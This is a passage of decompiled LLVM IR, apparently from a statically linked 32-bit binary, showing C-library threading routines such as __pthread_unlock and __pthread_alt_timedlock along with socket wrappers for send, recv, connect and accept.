  br i1 %v4_8057ba8, label %dec_label_pc_8057b61, label %dec_label_pc_8057bae

dec_label_pc_8057bb1:                             ; preds = %dec_label_pc_8057bb8.preheader, %dec_label_pc_8057bb1
  %v0_8057bb1 = load i32, i32* @edi, align 4
  store i32 %v0_8057bb1, i32* @eax, align 4
  %v0_8057bb3 = call i32 @restart.3()
  %v0_8057bb8 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8057bb8 = add i32 %v0_8057bb8, -1
  store i32 %v1_8057bb8, i32* %ebp.global-to-local, align 4
  %v10_8057bb9 = icmp eq i32 %v0_8057bb8, 0
  %v1_8057bbc = icmp eq i1 %v10_8057bb9, false
  br i1 %v1_8057bbc, label %dec_label_pc_8057bb1, label %dec_label_pc_8057bbe

dec_label_pc_8057bbe:                             ; preds = %dec_label_pc_8057bb8.preheader, %dec_label_pc_8057bb1, %dec_label_pc_8057b4b
  %v0_8057bc5 = phi i32 [ %v2_8057b54, %dec_label_pc_8057b4b ], [ %v0_8057b90, %dec_label_pc_8057bb8.preheader ], [ %v0_8057bb3, %dec_label_pc_8057bb1 ]
  store i32 %v0_8057b3e, i32* @ebx, align 4
  store i32 %v0_8057b3d, i32* @esi, align 4
  store i32 %v0_8057b3c, i32* @edi, align 4
  ret i32 %v0_8057bc5

; uselistorder directives
  uselistorder i32 %v0_8057ba8, { 1, 0 }
  uselistorder i1 %v15_8057b92, { 1, 2, 0 }
  uselistorder i32 %v2_8057b92, { 1, 0 }
  uselistorder i32 %v0_8057b82, { 1, 0, 2 }
  uselistorder i32 %v2_8057b61, { 2, 1, 0, 3 }
  uselistorder i1 %v15_8057b54, { 1, 0, 2 }
  uselistorder i32 %v2_8057b54, { 0, 2, 1 }
  uselistorder i32 %v0_8057b3e, { 1, 2, 0 }
  uselistorder i32 %v0_8057b3d, { 1, 2, 0 }
  uselistorder i32* %ecx.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder i32* %ebp.global-to-local, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder label %dec_label_pc_8057bbe, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057bb1, { 1, 0 }
  uselistorder label %dec_label_pc_8057bae, { 1, 0 }
  uselistorder label %dec_label_pc_8057b90, { 1, 0 }
  uselistorder label %dec_label_pc_8057b89, { 1, 0 }
  uselistorder label %dec_label_pc_8057b82, { 1, 0 }
  uselistorder label %dec_label_pc_8057b61, { 1, 2, 0, 3 }
}

define i32 @__pthread_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp27 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8057bc9 = load i32, i32* @ebx, align 4
  store i32 %v0_8057bc9, i32* %stack_var_-16, align 4
  store i32 %tmp27, i32* @ecx, align 4
  br label %dec_label_pc_8057be2

dec_label_pc_8057bd3:                             ; preds = %dec_label_pc_8057be2
  %v2_8057bd7 = load i32, i32* %v1_8057be2, align 4
  %v15_8057bd7 = icmp eq i32 %v2_8057bd7, 1
  %v22_8057bd7 = select i1 %v15_8057bd7, i32 0, i32 %v2_8057bd7
  store i32 %v22_8057bd7, i32* %v1_8057be2, align 4
  %v1_8057bdb = zext i1 %v15_8057bd7 to i32
  %v2_8057bdb = load i32, i32* %edx.global-to-local, align 4
  %v3_8057bdb = and i32 %v2_8057bdb, -256
  %v4_8057bdb = or i32 %v3_8057bdb, %v1_8057bdb
  store i32 %v4_8057bdb, i32* @edx, align 4
  %v4_8057bde = icmp eq i1 %v15_8057bd7, false
  %v1_8057be0 = icmp eq i1 %v4_8057bde, false
  br i1 %v1_8057be0, label %dec_label_pc_8057c5a.loopexit, label %dec_label_pc_8057be2.backedge

dec_label_pc_8057be2.backedge:                    ; preds = %dec_label_pc_8057bd3, %dec_label_pc_8057c1b
  %v0_8057be2.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8057be2

dec_label_pc_8057be2:                             ; preds = %dec_label_pc_8057be2.backedge, %entry
  %v0_8057bd7 = phi i32 [ %v0_8057be2.pre, %dec_label_pc_8057be2.backedge ], [ %tmp27, %entry ]
  %v1_8057be2 = inttoptr i32 %v0_8057bd7 to i32*
  %v2_8057be2 = load i32, i32* %v1_8057be2, align 4
  store i32 %v2_8057be2, i32* %edx.global-to-local, align 4
  %v9_8057be4 = icmp eq i32 %v2_8057be2, 1
  br i1 %v9_8057be4, label %dec_label_pc_8057bd3, label %dec_label_pc_8057be9

dec_label_pc_8057be9:                             ; preds = %dec_label_pc_8057be2
  %v1_8057beb = and i32 %v2_8057be2, -2
  store i32 %v1_8057beb, i32* %edi.global-to-local, align 4
  %v1_8057c133 = icmp eq i32 %v1_8057beb, 0
  %v1_8057c1510 = icmp eq i1 %v1_8057c133, false
  br i1 %v1_8057c1510, label %dec_label_pc_8057bfd, label %dec_label_pc_8057c1b

dec_label_pc_8057bfd:                             ; preds = %dec_label_pc_8057be9, %dec_label_pc_8057c0a
  %v0_8057c1726 = phi i32 [ %v0_8057c1725, %dec_label_pc_8057c0a ], [ %v0_8057bd7, %dec_label_pc_8057be9 ]
  %v0_8057c05 = phi i32 [ %v1_8057c0a, %dec_label_pc_8057c0a ], [ %v0_8057bd7, %dec_label_pc_8057be9 ]
  %v3_8057c00 = phi i32 [ %v3_8057c0021, %dec_label_pc_8057c0a ], [ 0, %dec_label_pc_8057be9 ]
  %v0_8057c0a = phi i32 [ %v1_8057c10, %dec_label_pc_8057c0a ], [ %v1_8057beb, %dec_label_pc_8057be9 ]
  %v1_8057bfd = add i32 %v0_8057c0a, 24
  %v2_8057bfd = inttoptr i32 %v1_8057bfd to i32*
  %v3_8057bfd = load i32, i32* %v2_8057bfd, align 4
  store i32 %v3_8057bfd, i32* @ebx, align 4
  %v5_8057c03 = icmp slt i32 %v3_8057bfd, %v3_8057c00
  br i1 %v5_8057c03, label %dec_label_pc_8057c0a, label %dec_label_pc_8057c05

dec_label_pc_8057c05:                             ; preds = %dec_label_pc_8057bfd
  br label %dec_label_pc_8057c0a

dec_label_pc_8057c0a:                             ; preds = %dec_label_pc_8057bfd, %dec_label_pc_8057c05
  %v0_8057c1725 = phi i32 [ %v0_8057c1726, %dec_label_pc_8057bfd ], [ %v0_8057c05, %dec_label_pc_8057c05 ]
  %v3_8057c0021 = phi i32 [ %v3_8057c00, %dec_label_pc_8057bfd ], [ %v3_8057bfd, %dec_label_pc_8057c05 ]
  %v1_8057c0a = add i32 %v0_8057c0a, 12
  %v2_8057c0d = inttoptr i32 %v1_8057c0a to i32*
  %v3_8057c0d = load i32, i32* %v2_8057c0d, align 4
  %v1_8057c10 = and i32 %v3_8057c0d, -2
  %v1_8057c13 = icmp eq i32 %v1_8057c10, 0
  %v1_8057c15 = icmp eq i1 %v1_8057c13, false
  br i1 %v1_8057c15, label %dec_label_pc_8057bfd, label %dec_label_pc_8057c17

dec_label_pc_8057c17:                             ; preds = %dec_label_pc_8057c0a
  %v12_8057c17 = icmp eq i32 %v0_8057c1725, %v0_8057bd7
  %v1_8057c19 = icmp eq i1 %v12_8057c17, false
  br i1 %v1_8057c19, label %dec_label_pc_8057c30, label %dec_label_pc_8057c1b

dec_label_pc_8057c1b:                             ; preds = %dec_label_pc_8057be9, %dec_label_pc_8057c17
  %v1_8057c1b = add i32 %v1_8057beb, 12
  %v2_8057c1b = inttoptr i32 %v1_8057c1b to i32*
  %v3_8057c1b = load i32, i32* %v2_8057c1b, align 4
  %v1_8057c20 = and i32 %v3_8057c1b, -2
  store i32 %v1_8057c20, i32* @ebx, align 4
  %v2_8057c23 = load i32, i32* %v1_8057be2, align 4
  %v15_8057c23 = icmp eq i32 %v2_8057be2, %v2_8057c23
  %v22_8057c23 = select i1 %v15_8057c23, i32 %v1_8057c20, i32 %v2_8057c23
  store i32 %v22_8057c23, i32* %v1_8057be2, align 4
  %v1_8057c27 = zext i1 %v15_8057c23 to i32
  %v2_8057c27 = load i32, i32* %edx.global-to-local, align 4
  %v3_8057c27 = and i32 %v2_8057c27, -256
  %v4_8057c27 = or i32 %v3_8057c27, %v1_8057c27
  store i32 %v4_8057c27, i32* %edx.global-to-local, align 4
  %v4_8057c2a = icmp eq i1 %v15_8057c23, false
  br i1 %v4_8057c2a, label %dec_label_pc_8057be2.backedge, label %dec_label_pc_8057c4c

dec_label_pc_8057c30:                             ; preds = %dec_label_pc_8057c17
  %v1_8057c30 = inttoptr i32 %v0_8057c1725 to i32*
  %v2_8057c30 = load i32, i32* %v1_8057c30, align 4
  %v1_8057c32 = and i32 %v2_8057c30, -2
  store i32 %v1_8057c32, i32* %edi.global-to-local, align 4
  %v1_8057c35 = add i32 %v1_8057c32, 12
  %v2_8057c35 = inttoptr i32 %v1_8057c35 to i32*
  %v3_8057c35 = load i32, i32* %v2_8057c35, align 4
  store i32 %v3_8057c35, i32* %v1_8057c30, align 4
  br label %dec_label_pc_8057c3a

dec_label_pc_8057c3a:                             ; preds = %dec_label_pc_8057c3a, %dec_label_pc_8057c30
  %v0_8057c3a = load i32, i32* @ecx, align 4
  %v1_8057c3a = inttoptr i32 %v0_8057c3a to i32*
  %v2_8057c3a = load i32, i32* %v1_8057c3a, align 4
  %v1_8057c3e = and i32 %v2_8057c3a, -2
  store i32 %v1_8057c3e, i32* %edx.global-to-local, align 4
  %v2_8057c41 = load i32, i32* %v1_8057c3a, align 4
  %v15_8057c41 = icmp eq i32 %v2_8057c3a, %v2_8057c41
  %v22_8057c41 = select i1 %v15_8057c41, i32 %v1_8057c3e, i32 %v2_8057c41
  store i32 %v22_8057c41, i32* %v1_8057c3a, align 4
  %v1_8057c45 = zext i1 %v15_8057c41 to i32
  %v2_8057c45 = load i32, i32* %edx.global-to-local, align 4
  %v3_8057c45 = and i32 %v2_8057c45, -256
  %v4_8057c45 = or i32 %v3_8057c45, %v1_8057c45
  store i32 %v4_8057c45, i32* %edx.global-to-local, align 4
  %v4_8057c48 = icmp eq i1 %v15_8057c41, false
  br i1 %v4_8057c48, label %dec_label_pc_8057c3a, label %dec_label_pc_8057c4c

dec_label_pc_8057c4c:                             ; preds = %dec_label_pc_8057c1b, %dec_label_pc_8057c3a
  %v0_8057c4c = load i32, i32* %edi.global-to-local, align 4
  %v1_8057c4c = add i32 %v0_8057c4c, 12
  %v2_8057c4c = inttoptr i32 %v1_8057c4c to i32*
  store i32 0, i32* %v2_8057c4c, align 4
  %v0_8057c53 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8057c53, i32* @eax, align 4
  %v0_8057c55 = call i32 @restart.3()
  br label %dec_label_pc_8057c5a

dec_label_pc_8057c5a.loopexit:                    ; preds = %dec_label_pc_8057bd3
  br label %dec_label_pc_8057c5a

dec_label_pc_8057c5a:                             ; preds = %dec_label_pc_8057c5a.loopexit, %dec_label_pc_8057c4c
  %v2_8057c5f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8057c5f, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i1 %v15_8057c41, { 1, 2, 0 }
  uselistorder i32 %v2_8057c41, { 1, 0 }
  uselistorder i1 %v15_8057c23, { 1, 2, 0 }
  uselistorder i32 %v2_8057c23, { 1, 0 }
  uselistorder i32 %v1_8057c10, { 1, 0 }
  uselistorder i32 %v1_8057c0a, { 1, 0 }
  uselistorder i32 %v3_8057c00, { 1, 0 }
  uselistorder i32 %v1_8057beb, { 1, 0, 2, 3 }
  uselistorder i32* %v1_8057be2, { 2, 3, 4, 1, 0 }
  uselistorder i32 %v0_8057bd7, { 2, 0, 1, 3 }
  uselistorder i1 %v15_8057bd7, { 1, 2, 0 }
  uselistorder i32 %v2_8057bd7, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32* %edi.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32 ()* @restart.3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057c4c, { 1, 0 }
  uselistorder label %dec_label_pc_8057c1b, { 1, 0 }
  uselistorder label %dec_label_pc_8057c0a, { 1, 0 }
  uselistorder label %dec_label_pc_8057bfd, { 1, 0 }
  uselistorder label %dec_label_pc_8057be2.backedge, { 1, 0 }
}

define i32 @__pthread_alt_timedlock(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %v0_8057c66 = load i32, i32* @esi, align 4
  %v0_8057c67 = load i32, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_8078e68.654 to i32), i32* @eax, align 4
  store i32 0, i32* @esi, align 4
  store i32 %tmp7, i32* @edi, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v1_8057c7a = call i32 @__pthread_acquire(i32 %v0_8057c67)
  %v0_8057c7f = load i32, i32* @global_var_8078e64.655, align 4
  %v1_8057c84 = icmp eq i32 %v0_8057c7f, 0
  br i1 %v1_8057c84, label %dec_label_pc_8057c91, label %dec_label_pc_8057c91.thread

dec_label_pc_8057c91.thread:                      ; preds = %entry
  store i32 %v0_8057c7f, i32* @esi, align 4
  %v1_8057c8a = inttoptr i32 %v0_8057c7f to i32*
  %v2_8057c8a = load i32, i32* %v1_8057c8a, align 4
  store i32 %v2_8057c8a, i32* @global_var_8078e64.655, align 4
  store i32 0, i32* @global_var_8078e68.654, align 8
  br label %dec_label_pc_8057cc5

dec_label_pc_8057c91:                             ; preds = %entry
  %v0_8057c9b.pre = load i32, i32* @esi, align 4
  store i32 0, i32* @global_var_8078e68.654, align 8
  %v1_8057c9b = icmp eq i32 %v0_8057c9b.pre, 0
  %v1_8057c9d = icmp eq i1 %v1_8057c9b, false
  br i1 %v1_8057c9d, label %dec_label_pc_8057cc5, label %dec_label_pc_8057c9f

dec_label_pc_8057c9f:                             ; preds = %dec_label_pc_8057c91
  store i32 12, i32* %stack_var_-44, align 4
  %v1_8057ca4 = call i32 @malloc(i32 12)
  store i32 %v1_8057ca4, i32* @esi, align 4
  %v1_8057cae = icmp eq i32 %v1_8057ca4, 0
  %v1_8057cb0 = icmp eq i1 %v1_8057cae, false
  br i1 %v1_8057cb0, label %dec_label_pc_8057cc5, label %dec_label_pc_8057cb2

dec_label_pc_8057cb2:                             ; preds = %dec_label_pc_8057c9f
  %v0_8057cb5 = load i32, i32* @edi, align 4
  store i32 %v0_8057cb5, i32* %stack_var_-44, align 4
  %v3_8057cb6 = inttoptr i32 %v0_8057cb5 to i32*
  %v4_8057cb6 = call i32 @__pthread_alt_lock(i32* %v3_8057cb6, i32 %v1_8057ca4, i32 %v1_8057ca4)
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057d2b

dec_label_pc_8057cc5:                             ; preds = %dec_label_pc_8057c91.thread, %dec_label_pc_8057c9f, %dec_label_pc_8057c91, %dec_label_pc_8057ce0
  %v0_8057cc5 = load i32, i32* @edi, align 4
  %v1_8057cc5 = inttoptr i32 %v0_8057cc5 to i32*
  %v2_8057cc5 = load i32, i32* %v1_8057cc5, align 4
  store i32 %v2_8057cc5, i32* @ebx, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8057ccc = icmp eq i32 %v2_8057cc5, 0
  br i1 %v1_8057ccc, label %dec_label_pc_8057cc5.dec_label_pc_8057ce0_crit_edge, label %dec_label_pc_8057cd0

dec_label_pc_8057cc5.dec_label_pc_8057ce0_crit_edge: ; preds = %dec_label_pc_8057cc5
  %v0_8057ce0.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057ce0

dec_label_pc_8057cd0:                             ; preds = %dec_label_pc_8057cc5
  %v0_8057cd0 = load i32, i32* @ebp, align 4
  %v1_8057cd0 = icmp eq i32 %v0_8057cd0, 0
  %v1_8057cd2 = icmp eq i1 %v1_8057cd0, false
  br i1 %v1_8057cd2, label %dec_label_pc_8057cdb, label %dec_label_pc_8057cd4

dec_label_pc_8057cd4:                             ; preds = %dec_label_pc_8057cd0
  %v0_8057cd4 = call i32 @thread_self.4()
  store i32 %v0_8057cd4, i32* @ebp, align 4
  br label %dec_label_pc_8057cdb

dec_label_pc_8057cdb:                             ; preds = %dec_label_pc_8057cd0, %dec_label_pc_8057cd4
  %v0_8057cdb = phi i32 [ %v0_8057cd0, %dec_label_pc_8057cd0 ], [ %v0_8057cd4, %dec_label_pc_8057cd4 ]
  %v1_8057cdb = load i32, i32* @esi, align 4
  %v2_8057cdb = add i32 %v1_8057cdb, 4
  %v3_8057cdb = inttoptr i32 %v2_8057cdb to i32*
  store i32 %v0_8057cdb, i32* %v3_8057cdb, align 4
  %v0_8057cde = load i32, i32* @esi, align 4
  store i32 %v0_8057cde, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057ce0

dec_label_pc_8057ce0:                             ; preds = %dec_label_pc_8057cc5.dec_label_pc_8057ce0_crit_edge, %dec_label_pc_8057cdb
  %v0_8057ce0 = phi i32 [ %v0_8057ce0.pre, %dec_label_pc_8057cc5.dec_label_pc_8057ce0_crit_edge ], [ %v0_8057cde, %dec_label_pc_8057cdb ]
  %v1_8057ce0 = add i32 %v0_8057ce0, 8
  %v2_8057ce0 = inttoptr i32 %v1_8057ce0 to i32*
  store i32 0, i32* %v2_8057ce0, align 4
  %v1_8057ce7 = load i32, i32* @esi, align 4
  %v2_8057ce7 = inttoptr i32 %v1_8057ce7 to i32*
  store i32 %v2_8057cc5, i32* %v2_8057ce7, align 4
  %v0_8057ceb = load i32, i32* @edi, align 4
  %v1_8057ceb = inttoptr i32 %v0_8057ceb to i32*
  %v2_8057ceb = load i32, i32* %v1_8057ceb, align 4
  %v3_8057ceb = load i32, i32* %edx.global-to-local, align 4
  %v15_8057ceb = icmp eq i32 %v2_8057cc5, %v2_8057ceb
  %v22_8057ceb = select i1 %v15_8057ceb, i32 %v3_8057ceb, i32 %v2_8057ceb
  store i32 %v22_8057ceb, i32* %v1_8057ceb, align 4
  %v1_8057cef = zext i1 %v15_8057ceb to i32
  %v2_8057cef = load i32, i32* %edx.global-to-local, align 4
  %v3_8057cef = and i32 %v2_8057cef, -256
  %v4_8057cef = or i32 %v3_8057cef, %v1_8057cef
  store i32 %v4_8057cef, i32* %edx.global-to-local, align 4
  %v4_8057cf2 = icmp eq i1 %v15_8057ceb, false
  br i1 %v4_8057cf2, label %dec_label_pc_8057cc5, label %dec_label_pc_8057cf6

dec_label_pc_8057cf6:                             ; preds = %dec_label_pc_8057ce0
  br i1 %v1_8057ccc, label %dec_label_pc_8057d1f, label %dec_label_pc_8057cfa

dec_label_pc_8057cfa:                             ; preds = %dec_label_pc_8057cf6
  %v0_8057cfa = load i32, i32* @edi, align 4
  %v0_8057d00 = load i32, i32* @ebp, align 4
  store i32 %v0_8057d00, i32* %stack_var_-44, align 4
  %v3_8057d01 = inttoptr i32 %v0_8057cfa to i32*
  %v4_8057d01 = call i32 @__pthread_timedsuspend_new(i32 %arg3, i32* %v3_8057d01, i32 %v0_8057cfa)
  %v1_8057d09 = icmp eq i32 %v4_8057d01, 0
  %v1_8057d0b = icmp eq i1 %v1_8057d09, false
  br i1 %v1_8057d0b, label %dec_label_pc_8057d1f, label %dec_label_pc_8057d0d

dec_label_pc_8057d0d:                             ; preds = %dec_label_pc_8057cfa
  %v1_8057d0d = and i32 %v4_8057d01, -256
  %v2_8057d0d = or i32 %v1_8057d0d, 1
  %v0_8057d0f = load i32, i32* @esi, align 4
  %v1_8057d0f = add i32 %v0_8057d0f, 8
  %v2_8057d0f = inttoptr i32 %v1_8057d0f to i32*
  %v3_8057d0f = load i32, i32* %v2_8057d0f, align 4
  store i32 %v2_8057d0d, i32* %v2_8057d0f, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8057d14 = icmp eq i32 %v3_8057d0f, 0
  br i1 %v1_8057d14, label %dec_label_pc_8057d2b, label %dec_label_pc_8057d18

dec_label_pc_8057d18:                             ; preds = %dec_label_pc_8057d0d
  %v0_8057d18 = load i32, i32* @ebp, align 4
  store i32 %v0_8057d18, i32* @eax, align 4
  %v0_8057d1a = load i32, i32* %stack_var_-44, align 4
  %v2_8057d1a = call i32 @suspend.5(i32 %v0_8057d1a, i32 %arg3)
  br label %dec_label_pc_8057d1f

dec_label_pc_8057d1f:                             ; preds = %dec_label_pc_8057cfa, %dec_label_pc_8057cf6, %dec_label_pc_8057d18
  %v0_8057d1f = load i32, i32* @esi, align 4
  store i32 %v0_8057d1f, i32* @eax, align 4
  %v0_8057d21 = call i32 @wait_node_free()
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057d2b

dec_label_pc_8057d2b:                             ; preds = %dec_label_pc_8057d0d, %dec_label_pc_8057cb2, %dec_label_pc_8057d1f
  %v0_8057d2e = phi i32 [ 0, %dec_label_pc_8057d0d ], [ 1, %dec_label_pc_8057cb2 ], [ 1, %dec_label_pc_8057d1f ]
  store i32 %v0_8057c67, i32* @ebx, align 4
  store i32 %v0_8057c66, i32* @esi, align 4
  ret i32 %v0_8057d2e

; uselistorder directives
  uselistorder i32 %v4_8057d01, { 1, 0 }
  uselistorder i1 %v15_8057ceb, { 1, 2, 0 }
  uselistorder i32 %v2_8057ceb, { 1, 0 }
  uselistorder i32 %v1_8057ca4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8057c7f, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 4, 5, 3, 6, 7 }
  uselistorder i32 ()* @wait_node_free, { 1, 0 }
  uselistorder i32 (i32, i32)* @suspend.5, { 3, 1, 0, 2 }
  uselistorder i32 ()* @thread_self.4, { 2, 0, 1 }
  uselistorder i32 (i32)* @__pthread_acquire, { 1, 0 }
  uselistorder i32* @global_var_8078e68.654, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8057d2b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057d1f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057ce0, { 1, 0 }
  uselistorder label %dec_label_pc_8057cdb, { 1, 0 }
  uselistorder label %dec_label_pc_8057cc5, { 3, 1, 2, 0 }
}

define i32 @sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057d38 = load i32, i32* @ebx, align 4
  store i32 %v0_8057d38, i32* %stack_var_-4, align 4
  %v2_8057d3c = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057d43 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057d3c)
  %v6_8057d62 = call i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6)
  store i32 %v6_8057d62, i32* @ebx, align 4
  %v3_8057d6e = load i32, i32* %stack_var_-8, align 4
  %v2_8057d72 = trunc i32 %v3_8057d6e to i8
  %v3_8057d72 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057d72, i32 0)
  %v0_8057d77 = load i32, i32* @ebx, align 4
  %v2_8057d7c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057d7c, i32* @ebx, align 4
  ret i32 %v0_8057d77
}

define i32 @sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8057d82 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057d89 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057d82)
  %v3_8057d9d = call i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_8057d9d, i32* @ebx, align 4
  %v3_8057da8 = load i32, i32* %stack_var_-8, align 4
  %v2_8057dac = trunc i32 %v3_8057da8 to i8
  %v3_8057dac = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057dac, i32 0)
  %v0_8057db1 = load i32, i32* @ebx, align 4
  ret i32 %v0_8057db1
}

define i32 @send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057db8 = load i32, i32* @ebx, align 4
  store i32 %v0_8057db8, i32* %stack_var_-4, align 4
  %v2_8057dbc = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057dc3 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057dbc)
  %v4_8057dd8 = call i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_8057dd8, i32* @ebx, align 4
  %v3_8057de4 = load i32, i32* %stack_var_-8, align 4
  %v2_8057de8 = trunc i32 %v3_8057de4 to i8
  %v3_8057de8 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057de8, i32 0)
  %v0_8057ded = load i32, i32* @ebx, align 4
  %v2_8057df2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057df2, i32* @ebx, align 4
  ret i32 %v0_8057ded
}

define i32 @recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8057df8 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057dff = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057df8)
  %v3_8057e13 = call i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_8057e13, i32* @ebx, align 4
  %v3_8057e1e = load i32, i32* %stack_var_-8, align 4
  %v2_8057e22 = trunc i32 %v3_8057e1e to i8
  %v3_8057e22 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057e22, i32 0)
  %v0_8057e27 = load i32, i32* @ebx, align 4
  ret i32 %v0_8057e27
}

define i32 @recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8057e32 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057e39 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057e32)
  store i32 %v2_8057e32, i32* @ebx, align 4
  %v6_8057e58 = call i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6)
  store i32 %v6_8057e58, i32* @ebx, align 4
  %v3_8057e64 = load i32, i32* %stack_var_-8, align 4
  %v2_8057e68 = trunc i32 %v3_8057e64 to i8
  %v3_8057e68 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057e68, i32 0)
  %v0_8057e6d = load i32, i32* @ebx, align 4
  ret i32 %v0_8057e6d
}

define i32 @recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057e74 = load i32, i32* @ebx, align 4
  store i32 %v0_8057e74, i32* %stack_var_-4, align 4
  %v2_8057e78 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057e7f = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057e78)
  %v4_8057e94 = call i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4)
  store i32 %v4_8057e94, i32* @ebx, align 4
  %v3_8057ea0 = load i32, i32* %stack_var_-8, align 4
  %v2_8057ea4 = trunc i32 %v3_8057ea0 to i8
  %v3_8057ea4 = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057ea4, i32 0)
  %v0_8057ea9 = load i32, i32* @ebx, align 4
  %v2_8057eae = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057eae, i32* @ebx, align 4
  ret i32 %v0_8057ea9
}

define i32 @connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057eb0 = load i32, i32* @ebx, align 4
  store i32 %v0_8057eb0, i32* %stack_var_-4, align 4
  %v2_8057eb4 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057ebb = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057eb4)
  %v3_8057ecf = call i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_8057ecf, i32* @ebx, align 4
  %v3_8057eda = load i32, i32* %stack_var_-8, align 4
  %v2_8057ede = trunc i32 %v3_8057eda to i8
  %v3_8057ede = call i32 @__GI_pthread_setcanceltype(i8 %v2_8057ede, i32 0)
  %v0_8057ee3 = load i32, i32* @ebx, align 4
  %v2_8057ee8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057ee8, i32* @ebx, align 4
  ret i32 %v0_8057ee3
}

define i32 @accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057eea = load i32, i32* @ebx, align 4
  store i32 %v0_8057eea, i32* %stack_var_-4, align 4
  %v2_8057eee = ptrtoint i32* %stack_var_-8 to i32
  %v3_8057ef5 = call i32 @__GI_pthread_setcanceltype(i8 1, i32 %v2_8057eee)
  %v3_8057f09 = call i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %arg1, i32* @ecx, align 4
  store i32 %v3_8057f09, i32* @ebx, align 4
  %v3_8057f14 = load i32, i32* %stack_var_-8, align 4
  %v2_8057f18 = trunc i32 %v3_8057f14 to i8
